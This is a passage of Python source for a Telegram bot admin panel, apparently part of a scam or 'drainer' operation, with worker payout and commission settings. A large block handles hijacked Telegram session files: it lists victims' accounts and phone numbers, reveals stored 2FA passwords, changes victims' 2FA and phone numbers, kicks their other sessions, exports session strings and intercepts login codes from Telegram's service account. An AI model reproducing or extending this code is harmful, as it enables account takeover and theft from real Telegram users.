        (f"<b><tg-emoji emoji-id='5278305362703835500'>🌐</tg-emoji> Выбери прокси:</b>"),
        parse_mode="HTML",
        reply_markup=markup,
    )
    await callback.answer()


@dp.callback_query(F.data == "admin_back")
async def admin_back(callback: CallbackQuery):
    await admin_panel(callback.message, check_admin=False)
    await callback.message.delete()
    await callback.answer()


@dp.callback_query(F.data.startswith("pf_version:"))
async def install_pyrofork_version(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    old_version = importlib.metadata.version("pyrofork")
    version = callback.data.split(":")[1]

    if old_version == version:
        return await callback.answer(
            mutate_text(f"❎ Уже стоит PyroFork {version}.") + " ^^", show_alert=True
        )

    msg = await callback.message.answer(
        mutate_text(f"⏳ Ставлю PyroFork <b>{version}</b>…") + worker_cute_suffix(),
        parse_mode="HTML",
    )

    try:
        process = subprocess.Popen(
            [
                sys.executable,
                "-m",
                "pip",
                "install",
                f"pyrofork=={version}",
                "--force-reinstall",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        stdout, stderr = process.communicate()
        result_text = (stdout.decode() or stderr.decode()).strip()
    except Exception as e:
        await msg.edit_text(
            mutate_text(
                f"❎ Не вышло поставить PyroFork {version}:\n<code>{e}</code>"
            )
            + worker_cute_suffix(),
            parse_mode="HTML",
        )
        return

    await msg.edit_text(
        mutate_text(f"☑️ PyroFork <b>{version}</b> установлен!"),
        parse_mode="HTML",
    )

    await callback.message.answer(
        mutate_text("🔘 Перезапусти скрипты из панели")
    )


@dp.callback_query(F.data.startswith("edit_proxy:"))
async def install_pyrofork_version(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    proxy_id = callback.data.split(":")[1]
    if proxy_id == "noproxy":
        proxy_id = None
    else:
        proxy_id = int(proxy_id)

    change_proxy(proxy_id)

    await callback.message.answer(
        mutate_text(f"<b>⏳ Меняю прокси…</b>") + worker_cute_suffix(),
        parse_mode="HTML",
    )
    await callback.message.answer(
        mutate_text("🔘 Перезапусти скрипты из панели") + " ^^"
    )


@dp.callback_query(F.data.startswith("send_again:"))
async def send_again_callback(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    user_id = callback.data.split(":")[1]

    await send_user_log(f"{absolute_path}/sessions/{user_id}", int(user_id))


@dp.callback_query(F.data.startswith("send_again_no_check:"))
async def send_again_no_check_callback(callback: CallbackQuery):
    user_id = callback.data.split(":")[1]

    await send_user_log(f"{absolute_path}/sessions/{user_id}", int(user_id))


def restart_scripts(scripts: list[str]):
    python_exec = sys.executable
    base_dir = os.path.dirname(os.path.abspath(__file__))

    for script in scripts:
        full_path = os.path.join(base_dir, script)
        restarted = False

        for proc in psutil.process_iter(["pid", "cmdline"]):
            try:
                cmd = proc.info["cmdline"]
                if cmd and any(
                    script in " ".join(cmd) for script in [full_path, script]
                ):
                    print(f"🔄 Завершаем {script} (PID {proc.pid})...")
                    proc.terminate()
                    restarted = True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        if restarted:
            try:
                psutil.wait_procs(
                    [p for p in psutil.process_iter() if p.pid == proc.pid], timeout=2
                )
            except Exception:
                pass

        print(f"🚀 Запуск {script}...")
        subprocess.Popen(
            [python_exec, full_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )


@dp.message(F.text == "/p")
async def profit_panels(message: Message):
    if message.from_user.id not in config.ADMIN_ID:
        return await message.answer(
            "<tg-emoji emoji-id='5278578973595427038'>⛔️</tg-emoji>Вход запрещен.",
            parse_mode="HTML",
        )

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=("💸 Выплатить"), callback_data="payout"
                )
            ],
            [
                InlineKeyboardButton(
                    text=("⚙️ Настроить проценты"),
                    callback_data="edit_procentages",
                )
            ],
            [
                InlineKeyboardButton(
                    text=("🧮 Коэффициент"), callback_data="edit_coefficient"
                )
            ],
        ]
    )

    await message.answer(
        (f"<b><tg-emoji emoji-id='5255933397750014894'>🛠</tg-emoji> Касса и выплаты</b>\n\nВыбери действие:"),
        parse_mode="HTML",
        reply_markup=markup,
    )


@dp.callback_query(F.data == "payout")
async def payout_callback(callback: CallbackQuery):
    bot_username = await bot.get_me()
    bot_username = bot_username.username

    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(mutate_text("⛔️ Только для админов.") + " ^^")

    profits_markup = []
    profits = database.read_profits()
    for profit in profits:
        profits_markup.append(
            [
                InlineKeyboardButton(
                    text=f"#{profit[0]} ({'{:.2f}'.format(float(profit[4]))} 💎)",
                    url=f"https://t.me/{bot_username}?start={profit[0]}",
                )
            ]
        )

    markup = InlineKeyboardMarkup(
        inline_keyboard=profits_markup
        + [
            [
                InlineKeyboardButton(
                    text="⬅️ Назад", callback_data="back_to_profit_panel"
                )
            ]
        ]
    )

    await callback.message.edit_text(
        (f"<b><tg-emoji emoji-id='5255933397750014894'>🛠</tg-emoji> Касса</b>\n\nВыбери запись:"),
        parse_mode="HTML",
        reply_markup=markup,
    )


@dp.callback_query(F.data == "back_to_profit_panel")
async def back_to_profit_panel_callback(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer("⛔️ Только для админов.")

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=("💸 Выплатить"), callback_data="payout"
                )
            ],
            [
                InlineKeyboardButton(
                    text=("⚙️ Настроить проценты"),
                    callback_data="edit_procentages",
                )
            ],
            [
                InlineKeyboardButton(
                    text=("🧮 Коэффициент"), callback_data="edit_coefficient"
                )
            ],
        ]
    )

    await callback.message.edit_text(
        f"<b><tg-emoji emoji-id='5255933397750014894'>🛠</tg-emoji> Касса и выплаты</b>\n\nВыбери действие:",
        parse_mode="HTML",
        reply_markup=markup,
    )


@dp.callback_query(F.data == "edit_procentages")
async def edit_procentages_callback(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer("⛔️ Только для админов.")
    with open(f"{absolute_path}/storage/procents.json", "r+", encoding="utf-8") as f:
        data = json.load(f)
        procentage = data.get("worker", [])

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if procentage == 40 else '🟥'} Проценты: 40%",
                    callback_data="set_procentage:40",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if procentage == 45 else '🟥'} Проценты: 45%",
                    callback_data="set_procentage:45",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if procentage == 50 else '🟥'} Проценты: 50%",
                    callback_data="set_procentage:50",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if procentage == 55 else '🟥'} Проценты: 55%",
                    callback_data="set_procentage:55",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if procentage == 60 else '🟥'} Проценты: 60%",
                    callback_data="set_procentage:60",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if procentage == 65 else '🟥'} Проценты: 65%",
                    callback_data="set_procentage:65",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if procentage == 70 else '🟥'} Проценты: 70%",
                    callback_data="set_procentage:70",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if procentage == 75 else '🟥'} Проценты: 75%",
                    callback_data="set_procentage:75",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if procentage == 80 else '🟥'} Проценты: 80%",
                    callback_data="set_procentage:80",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"⬅️ Назад", callback_data="back_to_profit_panel"
                )
            ],
        ]
    )

    if callback.message.reply_markup != markup:
        await callback.message.edit_reply_markup(reply_markup=markup)


@dp.callback_query(F.data.startswith("set_procentage"))
async def set_procentages_callback(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(mutate_text("⛔️ Только для админов.") + " ^^")

    new_procentage = int(callback.data.split(":")[1])

    json_precentage = open(f"{absolute_path}/storage/procents.json", "r").read()
    json_precentage = json.loads(json_precentage)

    json_precentage["worker"] = int(new_procentage)
    with open(f"{absolute_path}/storage/procents.json", "w") as f:
        json.dump(json_precentage, f)

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_procentage == 40 else '🟥'} Проценты: 40%",
                    callback_data="set_procentage:40",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_procentage == 45 else '🟥'} Проценты: 45%",
                    callback_data="set_procentage:45",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_procentage == 50 else '🟥'} Проценты: 50%",
                    callback_data="set_procentage:50",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_procentage == 55 else '🟥'} Проценты: 55%",
                    callback_data="set_procentage:55",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_procentage == 60 else '🟥'} Проценты: 60%",
                    callback_data="set_procentage:60",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_procentage == 65 else '🟥'} Проценты: 65%",
                    callback_data="set_procentage:65",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_procentage == 70 else '🟥'} Проценты: 70%",
                    callback_data="set_procentage:70",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_procentage == 75 else '🟥'} Проценты: 75%",
                    callback_data="set_procentage:75",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_procentage == 80 else '🟥'} Проценты: 80%",
                    callback_data="set_procentage:80",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"⬅️ Назад", callback_data="back_to_profit_panel"
                )
            ],
        ]
    )

    if callback.message.reply_markup != markup:
        await callback.message.edit_reply_markup(reply_markup=markup)


@dp.callback_query(F.data == "edit_coefficient")
async def edit_coefficient_callback(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(mutate_text("⛔️ Только для админов.") + " ^^")

    json_coefficient = open(f"{absolute_path}/storage/procents.json", "r").read()
    json_coefficient = json.loads(json_coefficient)

    coefficient = float(json_coefficient["coefficient"])

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if coefficient == 0.70 else '🟥'} Коэффициент: 0.70",
                    callback_data="set_coefficient:0.70",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if coefficient == 0.75 else '🟥'} Коэффициент: 0.75",
                    callback_data="set_coefficient:0.75",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if coefficient == 0.80 else '🟥'} Коэффициент: 0.80",
                    callback_data="set_coefficient:0.80",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if coefficient == 0.85 else '🟥'} Коэффициент: 0.85",
                    callback_data="set_coefficient:0.85",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if coefficient == 0.90 else '🟥'} Коэффициент: 0.90",
                    callback_data="set_coefficient:0.90",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if coefficient == 0.95 else '🟥'} Коэффициент: 0.95",
                    callback_data="set_coefficient:0.95",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"⬅️ Назад", callback_data="back_to_profit_panel"
                )
            ],
        ]
    )

    if callback.message.reply_markup != markup:
        await callback.message.edit_reply_markup(reply_markup=markup)


@dp.callback_query(F.data.startswith("set_coefficient"))
async def set_coefficient_callback(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(mutate_text("⛔️ Только для админов.") + " ^^")

    new_coefficient = float(callback.data.split(":")[1])

    json_coefficient = open(f"{absolute_path}/storage/procents.json", "r").read()
    json_coefficient = json.loads(json_coefficient)

    json_coefficient["coefficient"] = new_coefficient
    with open(f"{absolute_path}/storage/procents.json", "w") as f:
        json.dump(json_coefficient, f)

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_coefficient == 0.70 else '🟥'} Коэффициент: 0.70",
                    callback_data="set_coefficient:0.70",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_coefficient == 0.75 else '🟥'} Коэффициент: 0.75",
                    callback_data="set_coefficient:0.75",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_coefficient == 0.80 else '🟥'} Коэффициент: 0.80",
                    callback_data="set_coefficient:0.80",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_coefficient == 0.85 else '🟥'} Коэффициент: 0.85",
                    callback_data="set_coefficient:0.85",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_coefficient == 0.90 else '🟥'} Коэффициент: 0.90",
                    callback_data="set_coefficient:0.90",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"{'🟩' if new_coefficient == 0.95 else '🟥'} Коэффициент: 0.95",
                    callback_data="set_coefficient:0.95",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"⬅️ Назад", callback_data="back_to_profit_panel"
                )
            ],
        ]
    )

    if callback.message.reply_markup != markup:
        await callback.message.edit_reply_markup(reply_markup=markup)

"""
async def check_dlc(event):
    return True


SESSIONS_DIR = Path("sessions")
import time


@dp.message(F.text == "/sessions")
async def sessions_panel(message: Message):
    if not await check_dlc(message):
        return

    if message.from_user.id not in config.ADMIN_ID:
        return await message.answer(
            mutate_text("⛔️ Сюда только для своих.") + worker_cute_suffix(),
            parse_mode="HTML",
        )

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=mutate_text("📱 Скан сессий"), callback_data="scan_sessions"
                )
            ],
            [
                InlineKeyboardButton(
                    text=mutate_text("❌ Отмена"), callback_data="delete"
                )
            ],
        ]
    )

    await message.answer(
        text=mutate_text("<b>Запустить скан всех сессий?</b>") + worker_cute_suffix(),
        parse_mode="HTML",
        reply_markup=markup,
    )


async def get_active_sessions_with_progress(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    session_files = [p for p in SESSIONS_DIR.glob("*.session") if p.is_file()]
    total = len(session_files)
    if total == 0:
        return [], 0

    active_results = []
    last_reported_percent = -10

    for i, s_path in enumerate(session_files):
        current_idx = i + 1
        percent = int((current_idx / total) * 100)

        if percent >= last_reported_percent + 10 or current_idx == total:
            last_reported_percent = percent
            bar = "🟩" * (percent // 10) + "⬜" * (10 - (percent // 10))
            try:
                await callback.message.edit_text(
                    f"🔍 <b>Сканирую сессии…</b>\n"
                    f"{bar} <b>{percent}%</b>\n"
                    f"{current_idx} / {total}"
                    + worker_cute_suffix(),
                    parse_mode="HTML",
                )
            except Exception:
                pass

        session_name = str(s_path.absolute())[:-8]
        client = Client(session_name, api_id=api_id, api_hash=api_hash, no_updates=True)

        try:
            await client.connect()
            me = await client.get_me()
            if me:
                active_results.append(
                    {
                        "id": me.id,
                        "username": me.username or "NoUser",
                        "first_name": me.first_name,
                        "session_file": s_path.name,
                    }
                )
        except Exception:
            pass
        finally:
            try:
                await client.disconnect()
            except:
                pass

        await asyncio.sleep(0.05)

    return active_results, total


cached_results = {}

cached_active = {}


@dp.callback_query(F.data.startswith("scan_sessions"))
async def scan_sessions_callback(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    data = callback.data.split(":")
    current_page = int(data[2]) if len(data) > 2 else 0
    user_id = callback.from_user.id
    items_per_page = 8

    if ":" not in callback.data or "refresh" in callback.data:
        active_list, total_found = await get_active_sessions_with_progress(callback)
        cached_active[user_id] = active_list
    else:
        active_list = cached_active.get(user_id, [])

    if not active_list:
        return await callback.message.edit_text(
            "📂 Пока пусто — активных сессий нет."
            + worker_cute_suffix(),
            parse_mode="HTML",
            reply_markup=InlineKeyboardBuilder()
            .button(text="🔄 Ещё раз", callback_data="scan_sessions:refresh")
            .as_markup(),
        )

    start_idx = current_page * items_per_page
    end_idx = start_idx + items_per_page
    page_items = active_list[start_idx:end_idx]
    total_pages = (len(active_list) + items_per_page - 1) // items_per_page

    text = (
        f"<b>✅ Онлайн-сессии · {len(active_list)}</b>\n"
        f"Страница {current_page + 1} из {total_pages}\n"
        f"Выбери аккаунт:"
        + worker_cute_suffix()
    )

    builder = InlineKeyboardBuilder()

    for item in page_items:
        btn_text = f"👤 {item['first_name']} | @{item['username']}"
        builder.row(
            types.InlineKeyboardButton(
                text=btn_text, callback_data=f"scan_session:{item['id']}"
            )
        )

    nav_row = []
    if current_page > 0:
        nav_row.append(
            types.InlineKeyboardButton(
                text="⬅️", callback_data=f"scan_sessions:page:{current_page - 1}"
            )
        )

    if end_idx < len(active_list):
        nav_row.append(
            types.InlineKeyboardButton(
                text="➡️", callback_data=f"scan_sessions:page:{current_page + 1}"
            )
        )

    if nav_row:
        builder.row(*nav_row)

    builder.row(
        types.InlineKeyboardButton(
            text="🔄 Обновить", callback_data="scan_sessions:refresh"
        )
    )

    await callback.message.edit_text(
        text, reply_markup=builder.as_markup(), parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("scan_session:"))
async def session_detail_callback(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    user_id_str = callback.data.split(":")[1]

    session_path = f"{absolute_path}/sessions/{user_id_str}"

    client = Client(session_path, api_id=api_id, api_hash=api_hash, no_updates=True)
    phone = 0

    try:
        await client.connect()
        me = await client.get_me()

        if not me:
            raise Exception("Не удалось получить данные аккаунта")

        premium_status = "✅ Да" if me.is_premium else "❌ Нет"
        username = f"@{me.username}" if me.username else "отсутствует"
        phone = me.phone_number

        text = (
            f"<b>📄 Карточка аккаунта</b>\n\n"
            f"<b>👤 Имя:</b> {me.first_name}\n"
            f"<b>🆔 ID:</b> <code>{me.id}</code>\n"
            f"<b>🔗 Логин:</b> {username}\n"
            f"<b>📱 Телефон:</b> <code>+{me.phone_number}</code>\n"
            f"<b>💎 Premium:</b> {premium_status}\n"
            f"<b>📁 Сессия:</b> <code>{session_path}.dsf</code>"
            + worker_cute_suffix()
        )

    except Exception as e:
        return await callback.message.edit_text(
            f"❌ Не вышло подключиться:\n{e}" + worker_cute_suffix(),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="⬅️ Назад к списку",
                            callback_data="scan_sessions:page:0",
                        )
                    ]
                ]
            ),
        )
    finally:
        await client.disconnect()

    builder = InlineKeyboardBuilder()

    builder.row(
        types.InlineKeyboardButton(
            text="📋 Отправить лог", callback_data=f"send_log:{user_id_str}"
        )
    )
    builder.row(
        types.InlineKeyboardButton(
            text="📱 Получить номер", callback_data=f"get_phone:{phone}"
        )
    )
    builder.row(
        types.InlineKeyboardButton(
            text="📩 Ожидание кода", callback_data=f"wait_code:{user_id_str}"
        )
    )
    builder.row(
        types.InlineKeyboardButton(
            text="🔐 Получить 2FA", callback_data=f"get_2fa:{user_id_str}"
        )
    )
    builder.row(
        types.InlineKeyboardButton(
            text="🔄🔐 Сменить 2FA", callback_data=f"change_2fa:{user_id_str}"
        )
    )
    builder.row(
        types.InlineKeyboardButton(
            text="🔄📱 Сменить Номер", callback_data=f"change_phone:{user_id_str}"
        )
    )
    builder.row(
        types.InlineKeyboardButton(
            text="❌ Кикнуть сессии", callback_data=f"kick_sessions:{user_id_str}"
        )
    )
    builder.row(
        types.InlineKeyboardButton(
            text="💻 sessionString", callback_data=f"get_session_string:{user_id_str}"
        )
    )
    builder.row(
        types.InlineKeyboardButton(
            text="⬅️ Назад к списку", callback_data="scan_sessions:page:0"
        )
    )

    await callback.message.edit_text(
        text, reply_markup=builder.as_markup(), parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("get_phone:"))
async def get_phone_callback(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    phone = callback.data.split(":")[1]

    await callback.message.answer(
        f"📞 Номер: <code>+{phone}</code>" + worker_cute_suffix(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data.startswith("get_2fa:"))
async def get_2fa_callback(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    user_id_str = callback.data.split(":")[1]

    json_2fa = open(f"{absolute_path}/storage/2fa.json", "r").read()
    json_2fa = json.loads(json_2fa)

    try:
        twoFA = json_2fa[user_id_str]
    except:
        twoFA = "Не найден в базе"

    await callback.message.answer(
        f"🔐 2FA: <code>{twoFA}</code>" + worker_cute_suffix(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data.startswith("change_phone:"))
async def change_phone_callback(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    user_id_str = callback.data.split(":")[1]

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ Сменить",
                    callback_data=f"confirm_change_phone:{user_id_str}",
                ),
                InlineKeyboardButton(text="❌ Нет", callback_data=f"delete"),
            ]
        ]
    )

    await callback.message.answer(
        f"Сменить номер у <code>{user_id_str}</code>?"
        + worker_cute_suffix(),
        parse_mode="HTML",
        reply_markup=markup,
    )


@dp.callback_query(F.data.startswith("confirm_change_phone:"))
async def confitrm_change_phone_callback(
    callback: types.CallbackQuery, state: FSMContext
):
    if not await check_dlc(callback):
        return

    await state.update_data(user_id_str=callback.data.split(":")[1])
    await state.set_state(ChangeNumberStates.waiting_for_number)
    await callback.message.answer(
        "Напиши номер в формате <code>+79991234567</code>" + worker_cute_suffix(),
        parse_mode="HTML",
    )


@dp.message(ChangeNumberStates.waiting_for_number)
async def process_new_number(message: Message, state: FSMContext):
    new_number = message.text
    await state.update_data(new_number=new_number)

    user_id_str = await state.get_data()
    user_id_str = user_id_str["user_id_str"]
    session_path = f"{absolute_path}/sessions/{user_id_str}"

    client = Client(session_path, api_id=api_id, api_hash=api_hash, no_updates=True)
    try:
        await client.connect()
    except Exception as e:
        await state.clear()
        return await message.answer(
            f"❌ Не вышло подключиться:\n{e}" + worker_cute_plain_suffix()
        )

    try:
        phone_hash = await client.invoke(
            send_change_phone_code.SendChangePhoneCode(
                phone_number=new_number, settings=code_settings.CodeSettings()
            )
        )
        await state.update_data(phone_hash=phone_hash)
        await state.set_state(ChangeNumberStates.waiting_for_code)
        return await message.answer(
            "📱 Запрос ушёл — пришли код из SMS" + worker_cute_plain_suffix()
        )
    except Exception as e:
        await state.clear()
        return await message.answer(
            f"❌ Смена номера не сработала:\n{e}" + worker_cute_plain_suffix()
        )


@dp.message(ChangeNumberStates.waiting_for_code)
async def process_new_number(message: Message, state: FSMContext):
    confirm_code = message.text

    user_id_str = state.get_data()["user_id_str"]
    session_path = f"{absolute_path}/sessions/{user_id_str}"

    new_number = await state.get_data()
    new_number = new_number["new_number"]
    phone_hash = await state.get_data()
    phone_hash = phone_hash["phone_hash"]

    client = Client(session_path, api_id=api_id, api_hash=api_hash, no_updates=True)
    try:
        await client.connect()
    except Exception as e:
        await state.clear()
        return await message.answer(
            f"❌ Не вышло подключиться:\n{e}" + worker_cute_plain_suffix()
        )

    try:
        result = await client.invoke(
            change_phone.ChangePhone(
                phone_number=new_number,
                phone_code_hash=phone_hash.phone_code_hash,
                phone_code=confirm_code,
            )
        )
        await state.clear()
        return await message.answer(
            f"📱 Готово, номер {new_number}\n<code>{result}</code>"
            + worker_cute_suffix(),
            parse_mode="HTML",
        )
    except Exception as e:
        await state.clear()
        return await message.answer(
            f"❌ Код не подошёл или сеть упала:\n{e}" + worker_cute_plain_suffix()
        )


@dp.callback_query(F.data.startswith("change_2fa:"))
async def change_2fa_callback(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    user_id_str = callback.data.split(":")[1]

    json_2fa = open(f"{absolute_path}/storage/2fa.json", "r").read()
    json_2fa = json.loads(json_2fa)

    try:
        twoFA = json_2fa[user_id_str]
    except:
        twoFA = ""

    new_twoFA = random.choices(string.ascii_letters + string.digits, k=16)

    session_path = f"{absolute_path}/sessions/{user_id_str}"

    client = Client(session_path, api_id=api_id, api_hash=api_hash, no_updates=True)
    try:
        await client.connect()
    except Exception as e:
        return await callback.message.answer(
            f"❌ Не вышло подключиться:\n{e}" + worker_cute_plain_suffix()
        )

    new_pw = "".join(new_twoFA)
    await client.change_cloud_password(
        current_password=twoFA, new_password=new_pw, new_hint="Uretra d0sh1k"
    )

    try:
        await client.disconnect()
    except:
        pass

    await callback.message.answer(
        f"🔐 Новый пароль 2FA: <code>{new_pw}</code>" + worker_cute_suffix(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data.startswith("kick_sessions:"))
async def kick_sessions_callback(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    user_id_str = callback.data.split(":")[1]

    session_path = f"{absolute_path}/sessions/{user_id_str}"
    client = Client(session_path, api_id=api_id, api_hash=api_hash, no_updates=False)

    try:
        await client.connect()
    except:
        pass

    session_string = await client.export_session_string()

    try:
        await client.disconnect()
    except:
        pass

    status_msg = await callback.message.answer(
        "⚙️ Кикаю остальные сессии…" + worker_cute_plain_suffix()
    )

    venv_python = f"{CODE_ROOT}/venv/bin/python3"
    script_path = f"{CODE_ROOT}/drainer/core/kick_sessions.py"

    try:
        process = await asyncio.create_subprocess_exec(
            venv_python,
            script_path,
            session_string,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await process.communicate()

        if process.returncode == 0:
            await status_msg.edit_text(
                f"✅ Готово\n\n<code>{stdout.decode()[:500]}</code>"
                + worker_cute_suffix(),
                parse_mode="HTML",
            )
        else:
            if "FRESH_RESET_AUTHORISATION_FORBIDDEN" in stderr.decode().upper():
                await status_msg.edit_text(
                    "❌ Сессия слишком свежая — подожди до суток"
                    + worker_cute_suffix(),
                    parse_mode="HTML",
                )
            else:
                await status_msg.edit_text(
                    "❌ Скрипт отвалился — смотри логи на сервере"
                    + worker_cute_suffix(),
                    parse_mode="HTML",
                )

    except Exception as e:
        await status_msg.edit_text(
            f"🆘 Не запустилось:\n<code>{e}</code>" + worker_cute_suffix(),
            parse_mode="HTML",
        )


@dp.callback_query(F.data.startswith("get_session_string:"))
async def get_session_string_callback(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    user_id_str = callback.data.split(":")[1]

    session_path = f"{absolute_path}/sessions/{user_id_str}"
    client = Client(session_path, api_id=api_id, api_hash=api_hash, no_updates=False)

    try:
        await client.connect()
    except:
        pass

    session_string = await client.export_session_string()

    try:
        await client.disconnect()
    except:
        pass

    await callback.message.answer(
        f"🔐 <code>{session_string}</code>" + worker_cute_suffix(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data.startswith("send_log:"))
async def send_log_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    await send_user_log(f"{absolute_path}/sessions/{user_id}", user_id)


from pyrogram import handlers


@dp.callback_query(F.data.startswith("wait_code:"))
async def wait_code_callback(callback: types.CallbackQuery):
    if not await check_dlc(callback):
        return

    user_id_str = callback.data.split(":")[1]

    session_path = f"{absolute_path}/sessions/{user_id_str}"

    await callback.message.answer(
        f"⏳ <b>Жду код для {user_id_str}</b>\n"
        f"Фильтр: <code>777000</code>\n\n"
        f"<i>5 минут таймер</i>"
        + worker_cute_suffix(),
        parse_mode="HTML",
    )

    client = Client(session_path, api_id=api_id, api_hash=api_hash, no_updates=False)
    target_sender_id = 777000

    code_received = asyncio.Event()

    async def message_handler(client, message):
        if message.from_user.id == target_sender_id:
            code_text = message.text or message.caption or "[Пустое сообщение]"

            await callback.message.answer(
                f"📩 <b>Поймал код</b>\n\n"
                f"От <code>{target_sender_id}</code>\n"
                f"<code>{code_text}</code>"
                + worker_cute_suffix(),
                parse_mode="HTML",
            )
            code_received.set()

    client.add_handler(handlers.MessageHandler(message_handler))

    try:
        await client.start()

        try:
            await asyncio.wait_for(code_received.wait(), timeout=300)
            await callback.message.answer(
                "✅ <b>Слушатель выключен</b>" + worker_cute_suffix(),
                parse_mode="HTML",
            )
        except asyncio.TimeoutError:
            await callback.message.answer(
                "⏰ <b>Таймаут 5 мин</b> — глянь сессию руками"
                + worker_cute_suffix(),
                parse_mode="HTML",
            )

    except Exception as e:
        await callback.message.answer(
            f"❌ Pyrogram: <code>{e}</code>" + worker_cute_suffix(),
            parse_mode="HTML",
        )
    finally:
        if client.is_connected:
            await client.stop()
"""

@dp.callback_query(F.data.startswith("commands"))
async def commands_callback(callback: types.CallbackQuery):
    username = await bot.get_me()
    username = username.username
    message = (
        f"<blockquote><tg-emoji emoji-id='5039880333554616347'>🧑‍💻</tg-emoji> Шпаргалка</blockquote>\n\n"
        f"<code>/draw</code> — <b>картинка с суммой</b>\n"
        f"<code>/check</code> — <b>чек / мультичек</b>\n"
        f"<code>/info</code> — <b>Проверка бота</b>\n\n"
        f"<b>Инлайн-чек:</b>\n<code>@{username} 100</code>"
        + worker_cute_suffix()
    )

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Скрыть", callback_data="delete")],
        ]
    )

    await callback.message.answer(message, parse_mode="HTML", reply_markup=markup)

@dp.callback_query(F.data == "control")
async def control_callback(callback: CallbackQuery):
